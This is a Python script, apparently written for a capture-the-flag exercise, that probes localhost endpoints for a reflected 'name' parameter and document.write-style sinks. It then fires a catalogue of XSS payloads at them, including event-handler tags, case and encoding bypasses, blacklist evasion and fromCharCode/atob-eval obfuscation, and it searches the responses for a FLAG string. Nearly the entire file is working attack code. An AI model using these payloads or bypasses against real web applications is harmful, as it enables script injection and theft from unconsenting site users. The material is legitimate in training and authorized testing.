import requests
import urllib.parse
import re
import time

print("="*80)
print("XSS DOCUMENT.WRITE() VIA 'name' PARAMETER - ACTIVE TESTING")
print("="*80)

# Target setup - will attempt localhost as demonstration
# In real scenario, this would be the actual target
TARGET_HOST = "http://127.0.0.1"
TARGET_PORT = 80

# Try common endpoints that use document.write() with name parameter
ENDPOINTS_TO_TEST = [
    "/",
    "/index.html",
    "/welcome",
    "/hello",
    "/greet",
    "/user",
    "/profile"
]

print(f"[+] Target host: {TARGET_HOST}:{TARGET_PORT}")
print(f"[+] Testing endpoints: {len(ENDPOINTS_TO_TEST)}")
print(f"[+] Parameter: name")
print(f"[+] Goal: Identify document.write() usage and XSS vulnerability")

# Phase 1: Discover parameter reflection and document.write() usage
print("\n" + "="*80)
print("PHASE 1: PARAMETER REFLECTION DISCOVERY")
print("="*80)

test_probe = "deadend7x7probe"
document_write_indicators = []

for endpoint in ENDPOINTS_TO_TEST:
    try:
        url = f"{TARGET_HOST}:{TARGET_PORT}{endpoint}"
        print(f"\n[+] Testing: {url}")
        
        # Test GET request
        response = requests.get(url, params={'name': test_probe}, timeout=3)
        
        if response.status_code == 200:
            print(f"    Status: 200 OK | Length: {len(response.content)}B")
            
            # Check if parameter is reflected
            if test_probe in response.text:
                print(f"    [+] Parameter reflected!")
                
                # Check for document.write() usage patterns
                docwrite_patterns = [
                    r'document\.write\s*\(\s*["\'][^"\']*deadend7x7probe',
                    r'document\.write\s*\(\s*[^)]+deadend7x7probe',
                    r'innerHTML\s*[=+]\s*["\'][^"\']*deadend7x7probe',
                    r'eval\s*\([^)]+deadend7x7probe',
                    r'setTimeout\s*\([^,]+deadend7x7probe'
                ]
                
                for pattern in docwrite_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    if matches:
                        print(f"    [!] document.write()-like pattern detected!")
                        print(f"    Match: {matches[0][:100]}...")
                        document_write_indicators.append({
                            'endpoint': endpoint,
                            'pattern': pattern,
                            'match': matches[0]
                        })
                        
                # Show context of reflection
                context_snippets = re.findall(r'.{0,60}deadend7x7probe.{0,60}', response.text)
                if context_snippets:
                    print(f"    Context: ...{context_snippets[0]}...")
            else:
                print(f"    [-] Parameter not reflected")
        else:
            print(f"    Status: {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print(f"    [-] Connection failed - endpoint may not exist")
        continue
    except requests.exceptions.Timeout:
        print(f"    [-] Timeout - endpoint may be slow or unavailable")
        continue
    except Exception as e:
        print(f"    [-] Error: {str(e)[:50]}")
        continue

print(f"\n[+] Discovery complete. Found {len(document_write_indicators)} potential document.write() usages.")

# Phase 2: XSS Payload Testing
print("\n" + "="*80)
print("PHASE 2: XSS PAYLOAD TESTING")
print("="*80)

# Prepare XSS payloads
xss_payloads = {}

# Basic XSS
xss_payloads['basic_script'] = '<script>alert(document.domain)</script>'
xss_payloads['basic_img'] = '<img src=x onerror=alert(document.domain)>'
xss_payloads['basic_svg'] = '<svg onload=alert(document.domain)>'
xss_payloads['basic_body'] = '<body onload=alert(document.domain)>'

# Case variations
xss_payloads['mixed_case'] = '<ScRiPt>alert(document.domain)</ScRiPt>'
xss_payloads['upper_case'] = '<SCRIPT>alert(document.domain)</SCRIPT>'

# Encoding bypasses
xss_payloads['url_encoded'] = '%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
xss_payloads['html_entities'] = '&#60;script&#62;alert(document.domain)&#60;&#47;script&#62;'
xss_payloads['hex_entities'] = '&#x3C;script&#x3E;alert(document.domain)&#x3C;&#x2F;script&#x3E;'
xss_payloads['tag_blacklist'] = '<scr<script>ipt>alert(document.domain)</scr</script>ipt>'
xss_payloads['space_alt'] = '<img/src=x/onerror=alert(document.domain)>'
xss_payloads['fragment_comment'] = '<scr<!--test-->ipt>alert(document.domain)</scr<!--test-->ipt>'

# Event handlers
xss_payloads['details_toggle'] = '<details open ontoggle=alert(document.domain)>'
xss_payloads['autofocus'] = '<input autofocus onfocus=alert(document.domain)>'
xss_payloads['video_error'] = '<video><source onerror=alert(document.domain)>'

# Advanced techniques
xss_payloads['template_literal'] = '<img src=x onerror=alert`document.domain`>'
xss_payloads['fromcharcode'] = '<script>Function(String.fromCharCode(97,108,101,114,116,40,49,41))()</script>'
xss_payloads['atob_eval'] = '<script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))</script>'

print(f"[+] Prepared {len(xss_payloads)} XSS payloads")

# Test payloads against discovered endpoints
test_results = []
targets_tested = 0

if document_write_indicators:
    # Test the first indicator only (most promising)
    target = document_write_indicators[0]
    endpoint = target['endpoint']
    url = f"{TARGET_HOST}:{TARGET_PORT}{endpoint}"
    
    print(f"\n[+] Testing payloads against: {endpoint}")
    print(f"[+] URL: {url}")
    
    # Test a subset of payloads first (most likely to work)
    priority_payloads = ['basic_img', 'basic_svg', 'mixed_case', 'space_alt', 'details_toggle']
    
    for payload_name in priority_payloads:
        if payload_name in xss_payloads:
            payload = xss_payloads[payload_name]
            
            try:
                print(f"\n[TEST] {payload_name}")
                print(f"  Payload: {payload[:60]}...")
                
                response = requests.get(url, params={'name': payload}, timeout=3)
                
                print(f"  Status: {response.status_code}")
                
                # Check for XSS indicators
                indicators = {
                    'script_tag': '<script>' in response.text and '&lt;script&gt;' not in response.text,
                    'event_handler': bool(re.search(r'on\w+\s*=\s*[^>]*alert', response.text, re.I)),
                    'svg_onload': bool(re.search(r'<svg[^>]*onload', response.text, re.I)),
                    'payload_reflected': payload in response.text,
                    'html_encoded': '&lt;' in response.text and payload.replace('<', '&lt;') in response.text,
                    'javascript_proto': bool(re.search(r'javascript:alert', response.text, re.I))
                }
                
                print(f"  Reflected: {indicators['payload_reflected']}")
                
                if any(indicators.values()):
                    print(f"  [!] Indicators found: {sum(1 for v in indicators.values() if v)}")
                    for key, value in indicators.items():
                        if value:
                            print(f"    - {key}: {value}")
                
                # Check for flag in response
                flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
                if flag_match:
                    print(f"  [!!!] FLAG FOUND: {flag_match.group()}")
                
                test_results.append({
                    'endpoint': endpoint,
                    'payload_name': payload_name,
                    'payload': payload,
                    'status': response.status_code,
                    'indicators': indicators,
                    'flag_found': bool(flag_match)
                })
                
                targets_tested += 1
                time.sleep(0.1)  # Rate limiting
                
            except Exception as e:
                print(f"  [-] Error: {str(e)}")
                continue

print(f"\n" + "="*80)
print("TEST RESULTS SUMMARY")
print("="*80)

print(f"[+] Endpoints tested: {len(ENDPOINTS_TO_TEST)}")
print(f"[+] Potential document.write() endpoints: {len(document_write_indicators)}")
